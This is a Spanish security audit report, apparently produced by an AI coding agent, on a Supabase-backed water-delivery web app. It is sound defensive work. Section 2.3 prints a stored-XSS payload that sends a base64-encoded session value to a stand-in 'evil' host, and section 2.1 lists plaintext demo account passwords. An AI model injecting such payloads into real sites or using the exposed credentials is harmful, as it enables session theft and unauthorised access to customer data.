# Informe de Auditoría — PROYECTO AGUA (WaterCore Space / Despacho Hídrico)

Fecha: 2026-09-06
Rama auditada: `demo-sandbox`
Autor: Claude (Sonnet 5), sesión autónoma

---

## 0. Resumen ejecutivo

| Área | Estado | Nota |
|---|---|---|
| Arquitectura | ⚠️ Aceptable para demo, no para producción | Un solo archivo `index.html` de 5.775 líneas / 340 KB |
| Autenticación | 🔴 Crítico | Credenciales en texto plano en el HTML servido; no hay backend de auth |
| Autorización (RLS) | 🔴 Crítico | Todas las tablas `using(true) with check(true)` + `GRANT` a `anon` |
| XSS | 🔴 Crítico | XSS almacenado real: BD escribible por cualquiera + render sin escapar |
| Cabeceras de seguridad | 🔴 Falta todo | Sin CSP, sin `X-Frame-Options`, sin `nosniff`, sin `Referrer-Policy` |
| Cadena de suministro | 🟠 Medio | 3 scripts de CDN sin SRI, versiones flotantes (`@2`) |
| Validación de entrada | 🟠 Medio | Formularios públicos sin límites ni saneo; sin rate-limit |
| Calidad de código | 🟢 Buena | Comentarios excelentes, legible, degradación elegante offline |
| Diseño / animación | 🟢 Base decente | 15 keyframes, respeta `prefers-reduced-motion`; el cliente quiere mucho más |
| Pruebas | 🔴 Inexistentes | 0 tests |
| Documentación infra | 🟠 Falta `estado-proyecto.md` | Lo exige la Sección 1.6 de las directrices globales |

**Veredicto:** funciona bien como prototipo y está sorprendentemente bien comentado, pero
la postura de seguridad es "todo el control vive en el navegador y la base de datos está
abierta al mundo". Cualquiera con la URL puede leer y borrar todos los datos de clientes
(nombres, teléfonos, direcciones, precios) y ejecutar JavaScript en la sesión de cualquier
administrador. Hay que cerrar eso antes de pensar en nada más.

---

## 1. Arquitectura

### 1.1 Cómo está montado
- **Frontend:** un único `index.html` estático. Sin framework, sin build. CSS embebido
  (líneas 15–734), cuerpo HTML (735–1438), toda la lógica en un IIFE de JavaScript ES5
  (1439–5775).
- **Hosting:** Vercel (proyecto `temporary-nimble-carbon-y0woxbp`, estático).
- **Datos:** Supabase `mwvyhjvafwimcdxfyutf` para sincronizar entre dispositivos las tablas
  `pedidos`, `gastos`, `solicitudes_centrales`, `ofertas_subasta`, `config_empresas`.
  Modelo "best-effort": si no hay red o el CDN no carga, la app cae a `localStorage` sin
  mostrar error.
- **Terceros:** Leaflet 1.9.4 (unpkg), `@supabase/supabase-js@2` (jsdelivr), Google Fonts.
- **Dominio de negocio:** marketplace multiempresa. Paraguas "WaterCore Space" + 5 empresas
  asociadas. Roles: `admin`, `chofer`, `promotor`, `ayudante`, `cliente`. Subasta estilo
  InDrive en el "Hub Central".

### 1.2 Lo que está bien
- **Comentarios de primer nivel.** Cada decisión no obvia está explicada con su porqué.
  Es de lo mejor que se ve en un proyecto de este tamaño.
- **Offline-first / degradación elegante.** La ausencia de Supabase nunca rompe la UI.
- **Reconciliación de DOM por id** en `renderLista()` para no recrear ni reanimar tarjetas
  sin cambios — buena decisión de rendimiento.
- **Theming por inquilino** con un solo `hue`/`sat` en `<html>` y todo derivado en CSS.
- **`prefers-reduced-motion`** respetado desde el día 1.

### 1.3 Lo que no está bien
- **Un archivo de 340 KB.** Imposible de testear por unidades, difícil de navegar, todo el
  estado global compartido en un closure. Debería dividirse (aunque sea con `<script type=module>`
  y varios ficheros servidos estáticamente).
- **Sin ninguna prueba.** Ni unitaria ni e2e. Lógica de comisiones/nómina sin cobertura.
- **Mapeos manuales camelCase↔snake_case** repartidos por todo el archivo
  (`pedidoARemoto`/`pedidoDesdeRemoto`, `configARemoto`, …) — fuente clásica de bugs por
  desincronización.
- **Artefactos basura en el repo:** `kunturmasha-web.zip` (338 KB) y `kunturmasha_app.html`
  (798 KB) versionados. No pertenecen a este proyecto y confunden (además rozan la regla de
  aislamiento de la Sección 1: "kunturmasha" es otro proyecto).
- **Falta `estado-proyecto.md`** en la raíz (lo exige la Sección 1.6 global).
- **Ramas ambiguas:** `master`, `demo`, `demo-sandbox`, más un worktree. No queda claro qué
  es producción.

---

## 2. Seguridad — hallazgos

### 2.1 🔴 CRÍTICO — Autenticación 100 % en el cliente con credenciales en claro
`index.html:1545` — el array `CREDENCIALES_PERSONAL` lleva correo y **contraseña en texto
plano** de todas las cuentas de personal, y se sirve tal cual al navegador:

```
piero@watercorespace.pe / piero2026   (superAdmin: los 4 roles + acceso global)
admin@watercorespace.pe / watercore2026
admin*@kunturmasha.pe   / admin2026
chofer*@kunturmasha.pe  / chofer2026
promotor*@kunturmasha.pe/ promotor2026
… + 150 cuentas del "Directorio Central" con contraseña de 8 dígitos derivada de un hash
   no criptográfico (h = h*31 + charCode) — determinista y trivial de reproducir/enumerar.
```

Cualquiera que abra "Ver código fuente" tiene acceso de SuperAdmin. El propio comentario lo
admite ("candado de interfaz… no una defensa contra quien lea el código fuente"). Para una
demo cerrada es una decisión; para algo con datos reales de clientes, no.

- No hay token de sesión real, ni expiración, ni rotación. La "sesión" es
  `localStorage["…sesion_personal_v1"] = {email}` revalidado contra el array.
- `btnCambiarModo` (`index.html:4875`) salta a la cuenta hermana **sin volver a pedir
  contraseña** (menor, dado que todo es cliente).

### 2.2 🔴 CRÍTICO — RLS completamente abierta + `GRANT` a `anon`
`supabase_schema.sql` — todas las tablas:

```sql
create policy "..._acceso_abierto" on public.<tabla> for all using (true) with check (true);
grant select, insert, update, delete on public.<tabla> to anon, authenticated;
```

La `anon key` (`sb_publishable_…`) está en el HTML (necesario para un SPA). Combinada con
RLS abierta, **cualquier persona en internet** puede, con `curl` contra la API REST de
Supabase y sin pasar por la app:

- Leer toda la tabla `pedidos`: nombre de cliente, teléfono, dirección, precio, chofer.
  (PII de clientes reales.)
- `DELETE` de todo `pedidos`, `gastos`, `solicitudes_centrales`, … — destrucción total.
- Insertar/editar ofertas de subasta ajenas, cambiar `config_empresas` (modelos de pago).
- Adjudicarse solicitudes del Hub Central.

Esto es un fallo de confidencialidad **e** integridad de todos los datos del sistema.

### 2.3 🔴 CRÍTICO — XSS almacenado
`renderTarjeta()` (`index.html:2851`) interpola en `innerHTML` **sin `escapeHtml()`**:

| Línea | Campo sin escapar |
|---|---|
| 2852, 2875 | `p.id` (atributo `data-id` y `<span class="order-id">`) |
| 2857 | `p.codigoCliente` |
| 2861 | `p.tipoAlmacen`, `p.piso` |
| 2863 | `p.dificultad` |
| 2864 | `p.manguera` |
| 2875 | `p.estado` |

Como la BD es escribible por cualquiera (2.2), un atacante hace un `INSERT` en `pedidos`
con `estado = '<img src=x onerror="fetch(\'//evil/?\'+btoa(localStorage.getItem(\'kunturmasha_sesion_personal_v1\')))">'`
y ese payload se ejecuta en **el navegador de cada administrador/chofer** que abra la agenda
de ese día. Desde ahí: robo de sesión, exfiltración de toda la BD con la anon key, pivote.

El resto de `innerHTML` (la mayoría) sí usa `escapeHtml()` — pero `escapeHtml` solo cubre
contexto de texto/atributo entre comillas dobles; no es seguro para contexto de URL/JS.

### 2.4 🔴 Falta el endurecimiento por cabeceras (Sección 3 de las directrices)
No hay `vercel.json` ni `<meta http-equiv>`. Faltan **todas**:
`Content-Security-Policy`, `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`
(la app es clicjackeable hoy), `Referrer-Policy: strict-origin-when-cross-origin`,
`Permissions-Policy`, y ocultar `X-Powered-By`.

### 2.5 🟠 Cadena de suministro
- `https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2` — etiqueta **flotante**; cualquier
  publicación futura del paquete cambia el código servido sin aviso.
- Leaflet y supabase-js **sin `integrity` (SRI)**. Compromiso del CDN o de la cuenta npm =
  JS arbitrario con acceso total al DOM y a la anon key.
- Leaflet se carga **síncrono en `<head>`** (bloquea render).

### 2.6 🟠 Validación / abuso
- El formulario público del Hub Central (`solicitudes_centrales`) no valida longitud ni
  formato y escribe directo a una tabla mundialmente escribible: se puede inundar (spam,
  DoS de coste en Supabase). No hay rate-limiting en ningún punto.
- `Number(p.precio).toFixed(2)` imprime `NaN` con datos malformados (que ahora cualquiera
  puede introducir).

### 2.7 🟢 / informativo
- `.env.local` con `VERCEL_OIDC_TOKEN`: está en `.gitignore` (bien). Token de vida corta;
  riesgo bajo, pero no debe copiarse a ningún sitio.
- `.gitignore` correcto (`.vercel`, `.env*`).
- `escapeHtml()` en sí está bien implementada para su uso previsto.

---

## 3. Correctitud y mantenibilidad

- **Lógica de negocio en el cliente:** comisiones (`COMISION_ESTANDAR`), nómina
  (`configPagosDe`), adjudicación de subasta — todo calculado y (a veces) persistido desde
  el navegador. Manipulable con devtools; dos dispositivos pueden divergir.
- **Sincronización Realtime hecha a mano** (`stringifyEstable`, `firmaLista`, `tarjetaHtmlCache`)
  — ingeniosa, pero frágil y difícil de razonar.
- **Centinela `'-'`** para "sin piso/almacén" mezclado con `''`/`null` — inconsistente.
- **`plantillaEmpresas`, `tinteEmpresas`, `configEmpresas`, checklist del ayudante** viven
  solo en `localStorage` de un navegador: no se comparten entre dispositivos ni personas.
- **150 cuentas del Directorio Central** se generan y se hacen `concat` a
  `CREDENCIALES_PERSONAL` en cada carga — infla el array y son cuentas reales logueables.

---

## 4. Diseño / animación (línea base, para el rediseño posterior)

- 15 `@keyframes`, ~20 `animation:`, ~21 `transition:`. `prefers-reduced-motion` cubierto.
- Tema "celeste pastel", rueda de color por empresa, glass suave.
- El cliente pide: **"10000 % más animaciones"**, estilo **"menús esponja"** (menús con
  física blanda / squash-stretch / gel), aspecto "súper profesional". Hay margen enorme:
  fondos WebGL/canvas reactivos, spring physics en modales y cajones, stagger en listas,
  skeletons animados, microinteracciones de botones (ripple/glow/elastic), transiciones de
  ruta. Todo respetando 60 FPS (`transform`/`opacity`) y `prefers-reduced-motion`.

---

## 5. Plan de corrección (orden de ejecución)

1. **XSS:** escapar todos los campos en `renderTarjeta()` y auditar el resto de sinks
   `innerHTML`. Añadir un helper `h()` (tagged template) que escape por defecto.
2. **Cabeceras:** `vercel.json` con CSP estricta (nonce no aplica en estático → usar
   `'self'` + allowlist exacta de CDNs + `object-src 'none'`, `frame-ancestors 'none'`,
   `base-uri 'none'`), `nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy`,
   `Permissions-Policy`, y `X-Powered-By` oculto. `<meta http-equiv>` de respaldo.
3. **SRI + versiones fijas:** pinar Leaflet y supabase-js a versión exacta con `integrity`,
   cargar `defer`.
4. **RLS (requiere que el usuario ejecute SQL — ver §6):** rediseño de políticas.
   Mínimo realista sin backend: separar lectura pública (agenda/subasta) de escritura;
   mover escrituras sensibles a `SECURITY DEFINER` RPC con validación, o a una Edge Function
   que actúe de gateway con clave de servicio. Ideal: Supabase Auth real.
5. **Validación de entrada** en todos los formularios (longitudes, tipos, listas blancas)
   + saneo antes de persistir.
6. **Quitar del repo** `kunturmasha-web.zip` y `kunturmasha_app.html`; crear
   `estado-proyecto.md`.
7. **Auto-pentest ×3** (métodos distintos), reinforme, contramedidas.
8. **Rediseño visual** + nuevas funciones.

---

## 6. Cosas que necesito que hagas tú (bloqueadas para mí)

> Por la **Sección 1 (aislamiento estricto)** de tus directrices globales: este proyecto usa
> el Supabase `mwvyhjvafwimcdxfyutf`, y las herramientas MCP de Supabase que tengo conectadas
> apuntan a **otros** proyectos (`supabase-aura`, `supabase-kunturmasha`). No puedo —ni debo—
> tocar la base de datos de AGUA con esas herramientas. Por tanto:

- [ ] **Ejecutar el nuevo `supabase_schema.sql`** (políticas RLS endurecidas) en el SQL
      Editor del proyecto `mwvyhjvafwimcdxfyutf`. Yo lo dejaré escrito y revisado.
- [ ] **Rotar credenciales** cuando pasemos de demo a real: la anon key actual y todas las
      contraseñas de `CREDENCIALES_PERSONAL` están quemadas (publicadas en el bundle).
- [ ] Decidir si se adopta **Supabase Auth** (recomendado) o una **Edge Function gateway**.
      Si Auth: yo adapto el cliente; tú activas el proveedor de correo en el dashboard.
- [ ] Confirmar **qué rama es producción** (`master` vs `demo`).
- [ ] Si quieres que conecte un MCP de Supabase al proyecto de AGUA, añádelo a la config de
      Claude Code y me lo dices (respeta el aislamiento: sería exclusivo de este proyecto).

---

_(Este informe se actualiza tras el auto-pentest en §7 — ver `INFORME-AUDITORIA-2.md`.)_
